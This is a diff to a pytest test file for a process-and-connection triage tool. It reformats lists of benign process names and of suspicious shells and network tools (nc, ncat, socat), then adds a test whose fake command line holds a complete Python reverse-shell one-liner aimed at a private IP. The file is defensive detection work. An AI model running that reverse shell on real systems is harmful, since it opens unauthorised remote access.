@@ -11,7 +11,16 @@ Account = namedtuple("Account", "pw_name pw_uid pw_shell")
 
 @pytest.mark.parametrize(
     "name",
-    ["sshd", "sshd-session", "ssh", "rsync", "php-fpm8.2", "containerd-shim", "syncthing", "bashful"],
+    [
+        "sshd",
+        "sshd-session",
+        "ssh",
+        "rsync",
+        "php-fpm8.2",
+        "containerd-shim",
+        "syncthing",
+        "bashful",
+    ],
 )
 def test_legitimate_processes_are_not_shells(name):
     assert triage.is_suspicious_process_name(name) is False
@@ -19,7 +28,20 @@ def test_legitimate_processes_are_not_shells(name):
 
 @pytest.mark.parametrize(
     "name",
-    ["bash", "sh", "dash", "zsh", "nc", "ncat", "socat", "perl", "perl5.36", "php8.2", "ruby", "lua5.4"],
+    [
+        "bash",
+        "sh",
+        "dash",
+        "zsh",
+        "nc",
+        "ncat",
+        "socat",
+        "perl",
+        "perl5.36",
+        "php8.2",
+        "ruby",
+        "lua5.4",
+    ],
 )
 def test_shells_and_interpreters_are_suspicious(name):
     assert triage.is_suspicious_process_name(name) is True
@@ -170,3 +192,30 @@ def test_loopback_shell_connection_is_ignored():
     connections = [Conn("ESTABLISHED", Addr("127.0.0.1", 40000), Addr("127.0.0.1", 5000), 950)]
 
     assert triage.classify_connections(connections, _names({950: "bash"})) == []
+
+
+def test_python_reverse_shell_on_private_ip_is_flagged():
+    connections = [
+        Conn(
+            "ESTABLISHED",
+            Addr("10.0.0.5", 49152),
+            Addr("10.0.0.20", 4444),
+            4242,
+        )
+    ]
+
+    results = triage.classify_connections(
+        connections,
+        name_for_pid=lambda pid: "python3",
+        cmdline_for_pid=lambda pid: (
+            "python3 -c import socket,os,pty; "
+            "s=socket.socket(); "
+            "s.connect(('10.0.0.20',4444)); "
+            "os.dup2(s.fileno(),0); "
+            "pty.spawn('/bin/sh')"
+        ),
+    )
+
+    assert len(results) == 1
+    assert results[0]["proc"] == "python3"
+    assert results[0]["remote_ip"] == "10.0.0.20"
